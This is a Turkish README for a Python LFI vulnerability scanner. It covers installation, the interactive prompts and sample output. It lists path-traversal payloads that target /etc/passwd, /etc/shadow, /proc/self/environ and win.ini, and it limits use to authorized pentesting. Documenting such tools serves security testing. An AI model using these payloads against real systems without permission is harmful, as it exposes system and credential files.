
# 🕵️‍♂️ LFI Tarayıcı (Local File Inclusion Vulnerability Scanner)

Bu Python aracı, web uygulamalarında **LFI (Local File Inclusion)** güvenlik açıklarını taramak için geliştirilmiştir. Basit ama etkili bir şekilde belirli bir URL ve parametre üzerinde LFI payload'larını deneyerek zafiyet olup olmadığını kontrol eder.

---

## 🚀 Kurulum

### Gereksinimler
- Python 3.6+
- `requests` ve `colorama` kütüphaneleri

### Kurulum Adımları

```bash

https://github.com/vedattascier/lfi.git
cd lfi
pip install -r requirements.txt
```

---

## ⚙️ Kullanım

```bash
python lfi.py
```

Program çalıştıktan sonra senden şu bilgileri ister:

- 🔗 **Hedef URL** (örn: `http://example.com/page.php`)
- 🧩 **Parametre İsmi** (örn: `file`)
- 📄 **Payload Dosyası** (örn: `wordlist.txt`)

### Örnek:

```bash
python lfi.py
```

```plaintext
Hedef URL'yi girin: http://example.com/view.php
Parametre adını girin: page
Payload dosyasının adını girin: wordlist.txt
```

---

## 📝 Payload Dosyası Formatı (`wordlist.txt`)

Her satırda bir payload olacak şekilde hazırlanmalıdır. Örnek içerik:

```
../../../../etc/passwd
../../../../../../windows/win.ini
....//....//....//....//etc/shadow
../../../../proc/self/environ
```

---

## 🔍 Örnek Çıktı

```plaintext
[i] Scanning http://example.com/view.php with param 'page'...
[+] Vulnerable: http://example.com/view.php?page=../../../../etc/passwd
[-] Error accessing: http://example.com/view.php?page=....//....//proc/self/environ
```

---

## 🛡️ Güvenlik Notu

Bu araç sadece **eğitim** ve **pentest** amaçlı kullanılmalıdır. İzin almadan bir sisteme uygulamak **yasal suçtur**.

---


